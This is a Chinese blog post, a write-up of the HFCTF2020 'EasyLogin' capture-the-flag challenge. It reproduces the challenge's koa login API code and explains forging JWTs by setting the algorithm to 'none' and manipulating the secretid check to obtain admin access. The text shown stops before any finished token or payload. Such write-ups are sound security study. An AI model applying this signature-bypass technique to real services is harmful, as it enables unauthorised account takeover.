<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>HFCTF2020-EasyLogin - inanb</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="inanb"><meta name="msapplication-TileImage" content="img/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="inanb"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="摘要jwt 伪造，一下写好长……em，圆满"><meta property="og:type" content="blog"><meta property="og:title" content="inanb"><meta property="og:url" content="https://removeif.github.io/"><meta property="og:site_name" content="inanb"><meta property="og:description" content="摘要jwt 伪造，一下写好长……em，圆满"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><meta property="article:published_time" content="2021-08-18T08:29:22.741Z"><meta property="article:modified_time" content="2021-08-31T03:41:27.228Z"><meta property="article:author" content="removeif"><meta property="article:tag" content="buuctf"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/08/18/HFCTF2020-EasyLogin/"},"headline":"inanb","image":["http://example.com/images/HFCTF2020-EasyLogin/image-20210818215957097.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818220627087.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818231056478.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818232015422.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818232341328.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210818234733270.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819154725607.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819154744913.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819155157713.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819155836881.png","http://example.com/images/HFCTF2020-EasyLogin/image-20210819160525000.png"],"datePublished":"2021-08-18T08:29:22.741Z","dateModified":"2021-08-31T03:41:27.228Z","author":{"@type":"Person","name":"inanb"},"description":"摘要jwt 伪造，一下写好长……em，圆满"}</script><link rel="canonical" href="http://example.com/2021/08/18/HFCTF2020-EasyLogin/"><link rel="icon" href="/img/favicon.ico"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="inanb" type="application/atom+xml">
</head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/music">音色</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-08-18  <a class="commentCountImg" href="/2021/08/18/HFCTF2020-EasyLogin/#comment-container"><span class="display-none-class">/2021/08/18/HFCTF2020-EasyLogin/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="69df56aa0e36913de91b1dbf8f3f7fda">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>19 分钟  <i class="fas fa-pencil-alt"> </i>2.9 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">HFCTF2020-EasyLogin</h1><div class="content"><blockquote>
<p>摘要<br>jwt 伪造，一下写好长……em，圆满</p>
<a id="more"></a>
</blockquote>
<div class="toc" tabindex="1">

<!-- toc -->

<ul>
<li><a href="#%E6%8E%A2%E7%B4%A2">探索</a></li>
<li><a href="#%E5%8F%8D%E6%8E%A8">反推</a><ul>
<li><a href="#koa-%E6%A1%86%E6%9E%B6">koa 框架</a></li>
<li><a href="#controller"><strong>controller</strong>？</a><ul>
<li><a href="#mvc-%E7%9A%84-c-controller"><strong>MVC 的 C – controller</strong></a></li>
<li><a href="#rest-api"><strong>REST api</strong></a></li>
</ul>
</li>
<li><a href="#%E7%BB%8F%E9%AA%8C">经验</a></li>
</ul>
</li>
<li><a href="#%E4%BC%AA%E9%80%A0">伪造</a><ul>
<li><a href="#%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84-jwt-%E5%BA%93">易受攻击的 JWT 库</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E4%B8%8E%E5%85%B6%E5%8E%9F%E7%90%86">绕过与其原理</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div><br>

<h4><span id="探索">探索</span></h4><p>有/login /register /home 页面</p>
<p>在/home页面getflag，提示<strong>permission denied</strong> ，估计是要admin权限，admin账号无法注册</p>
<p><strong>引入的 js：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  或许该用 koa-static 来处理静态文件</span></span><br><span class="line"><span class="comment"> *  路径该怎么配置？不管了先填个根目录XD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> token = sessionStorage.getItem(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    $.post(<span class="string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="attr">authorization</span>:token&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">                <span class="built_in">document</span>.location = <span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    $.post(<span class="string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.setItem(<span class="string">&#x27;token&#x27;</span>, token);</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/logout&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/flag&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;flag&#125; = data;</span><br><span class="line">        $(<span class="string">&quot;#username&quot;</span>).val(flag);</span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">        alert(xhr.responseJSON.message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>抓包的时候发现很奇怪，似乎并没有账户数据。注册时会给一个授权(<strong>authorization</strong>)，base64解一下发现是 <strong>jwt</strong>，整个登录流程全靠jwt的验证，所以需要对jwt有所了解。</p>
<img src="/images/HFCTF2020-EasyLogin/image-20210818215957097.png" alt="image-20210818215957097" style="zoom:80%;">

<p><img src="/images/HFCTF2020-EasyLogin/image-20210818220627087.png" alt="image-20210818220627087"></p>
<blockquote>
<p>登陆成功后会返回一个base64加密后的用户数据和一个签名</p>
</blockquote>
<blockquote>
<p>1、前后端分离，即服务端和前端只关心自己的事。</p>
<p>2、使用 <strong>jwt</strong> 作为 <strong>api</strong> 认证凭证</p>
<p>3、服务端仅保存加密用的<strong>secret</strong></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">深入了解Json Web Token之实战篇 </a></p>
<p><strong>将加密方式改为’none’</strong></p>
<p>下文实战中的 Juice Shop JWT issue 1 便是这个问题。之前谈及过nonsecure JWT的问题。</p>
<p>签名算法确保恶意用户在传输过程中不会修改JWT。但是标题中的alg字段可以更改为none。一些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器。</p>
</blockquote>
<p>此时我们知道，可以更改加密方法，不生成签名，绕过签名验证</p>
<p>但过不去，我们还需要看一个东西</p>
<h4><span id="反推">反推</span></h4><p>解题我们还需要看 <strong>/controllers/api.js</strong> 这么个玩意……这也扫不出来啊……</p>
<p>作为一个啥也不懂的菜鸡，如果从一个开发者的角度去思考……</p>
<blockquote>
<p>以下是个人理解……</p>
</blockquote>
<h5><span id="koa-框架">koa 框架</span></h5><blockquote>
<p>/**</p>
<ul>
<li><p>或许该用 koa-static 来处理静态文件</p>
</li>
<li><p>路径该怎么配置？不管了先填个根目录XD</p>
<p>  */</p>
</li>
</ul>
</blockquote>
<p>在引入的js中，可以看到 <strong>koa-static</strong>，查看下koa的框架结构：</p>
<ol>
<li>不包含 <strong>controller</strong></li>
</ol>
<p><a target="_blank" rel="noopener" href="https://segmentfault.com/q/1010000021297024">koa是否有必要实现controllers？ 如何实现？</a></p>
<ol start="2">
<li>包含 <strong>controller</strong></li>
</ol>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_36554693/article/details/105683996">Koa入门（一）—— Koa项目基础框架搭建</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33894640/article/details/91459845">一步一步教你完成Koa2接口开发</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43702430/article/details/103456209">koa后端模板</a></p>
<ol start="3">
<li>包含 <strong>controller</strong> 的 <strong>MVC</strong> 架构</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/47259f48c153">从零开始搭建koa后台基础框架</a>    <em>（这个其实不是很合适  :D</em></p>
<h5><span id="controller"><strong>controller</strong>？</span></h5><p>由此可见 koa 框架并没有规定controller的存在，而controller在<strong>不同语境</strong>下有着不同的作用</p>
<h6><span id="mvc-的-c-controller"><strong>MVC 的 C – controller</strong></span></h6><blockquote>
<p><em><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ghxb/p/8427462.html">MVC 于三层架构最大的区别</a></em></p>
<p><em><a target="_blank" rel="noopener" href="https://blog.csdn.net/csh624366188/article/details/7183872">mvc与三层结构终极区别</a></em></p>
<p>趁机复习下开发时学到架构知识😋</p>
</blockquote>
<img src="/images/HFCTF2020-EasyLogin/image-20210818231056478.png" alt="image-20210818231056478" style="zoom:67%;">

<p>上图明显的标出，javaweb中servlet的作用正是 <strong>controller</strong></p>
<p><img src="/images/HFCTF2020-EasyLogin/image-20210818232015422.png" alt="image-20210818232015422"></p>
<p><strong>servlet</strong> 作为 <strong>jsp</strong> 与 <strong>Model</strong> 数据交换的平台，上接 <strong>jsp</strong>，下接 **service **，按理来说是这样</p>
<img src="/images/HFCTF2020-EasyLogin/image-20210818232341328.png" alt="image-20210818232341328" style="zoom:89%;">

<blockquote>
<p>这图不是很合适……</p>
</blockquote>
<p>访问不同的servlet，会使用不同的**业务逻辑(service)**，业务逻辑则根据原子化的数据访问层指向符合需求的数据操作</p>
<p>如果再次细化，以便面向需求灵活的调整，或者<strong>前后端分离</strong>、合作，又出现了 <strong>routes(路由)**，路由可以负责分发不同的请求，处理</strong>前端**。</p>
<p>而基于路由的分发，<strong>接口(api)**，作为请求</strong>后端**数据的地址与方式也出现了。</p>
<p>但怎么写呢？上面的例子中也有人把controller写到route中去……</p>
<blockquote>
<p>虽然题目说都放根目录……</p>
</blockquote>
<h6><span id="rest-api"><strong>REST api</strong></span></h6><blockquote>
<p>*<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/75389ea9a90b">rest api介绍</a>*：rest api 是前后端分离最佳实践，是开发的一套标准或者说是一套规范，不是框架。</p>
<p><strong>什么是REST呢?</strong></p>
<p>REST是Representational State Transfer（表现层状态转移）的缩写，它是由罗伊·菲尔丁（Roy Fielding）提出的，是用来描述创建HTTP API的标准方法的，他发现这四种常用的行为（查看（view），创建（create），编辑（edit）和删除（delete））都可以直接映射到HTTP 中已实现的GET,POST,PUT和DELETE方法。</p>
<p>—— <em><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42611547/article/details/84346809">什么是REST API</a></em></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/28557115">怎样用通俗的语言解释REST，以及RESTful？</a></p>
</blockquote>
<p><strong>实际上，接口开发的rest api规范十分接近答案</strong></p>
<blockquote>
<p><strong>开发REST API</strong></p>
<p>rest-hello 工程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">rest-koa&#x2F;</span><br><span class="line">|</span><br><span class="line">+- .vscode&#x2F;</span><br><span class="line">|  |</span><br><span class="line">|  +- launch.json &lt;-- VSCode 配置文件</span><br><span class="line">|</span><br><span class="line">+- controllers&#x2F;</span><br><span class="line">|  |</span><br><span class="line">|  +- api.js &lt;-- REST API</span><br><span class="line">|  |</span><br><span class="line">|  +- index.js &lt;-- MVC Controllers</span><br><span class="line">|</span><br><span class="line">+- products.js &lt;-- 集中处理Product</span><br><span class="line">|</span><br><span class="line">+- rest.js &lt;-- 支持REST的middleware</span><br><span class="line">|</span><br><span class="line">+- app.js &lt;-- 使用koa的js</span><br><span class="line">|</span><br><span class="line">+- controller.js &lt;-- 扫描注册Controller</span><br><span class="line">|</span><br><span class="line">+- static-files.js &lt;-- 支持静态文件的middleware</span><br><span class="line">|</span><br><span class="line">+- templating.js &lt;-- 支持Nunjucks的middleware</span><br><span class="line">|</span><br><span class="line">+- package.json &lt;-- 项目描述文件</span><br><span class="line">|</span><br><span class="line">+- views&#x2F; &lt;-- Nunjucks模板</span><br><span class="line">|</span><br><span class="line">+- static&#x2F; &lt;-- 静态资源文件</span><br><span class="line">|</span><br><span class="line">+- node_modules&#x2F; &lt;-- npm安装的所有依赖包</span><br></pre></td></tr></table></figure>

<p><em>——<a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1022910821149312/1105009634703392">开发REST API</a></em></p>
<img src="/images/HFCTF2020-EasyLogin/image-20210818234733270.png" alt="image-20210818234733270" style="zoom:67%;">

<p><em>——<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33894640/article/details/91459845">一步一步教你完成Koa2接口开发I</a></em></p>
</blockquote>
<p>随着工程的增加及工程人员的增多、需求的增多，我们需要合理的规范来保证代码的管理效率与花费。这些结构上的细化便随之加深。</p>
<blockquote>
<p>看着感觉十分河里啊……这都是经验啊~</p>
</blockquote>
<h5><span id="经验">经验</span></h5><p>有了以上知识作为铺垫，再看引入的 app.js ，我们会发现，这似乎是通过api通信的……</p>
<p>顺理成章地，如果我们能读取api的逻辑，应该就可以成功伪造jwt了！ </p>
<blockquote>
<p>难点也就在于此了吧……</p>
<p>即使用koa-static托管静态资源，接口也有可能被爬到吧……只有混淆或加密？</p>
<p>不太懂欸……</p>
</blockquote>
<h4><span id="伪造">伪造</span></h4><p>/controllers/api.js：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!username || username === <span class="string">&#x27;admin&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params"><span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!username || !password</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">ctx.session.username !== <span class="string">&#x27;admin&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>要求用户名为admin，可以查到flag</p>
<p>登录验证：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

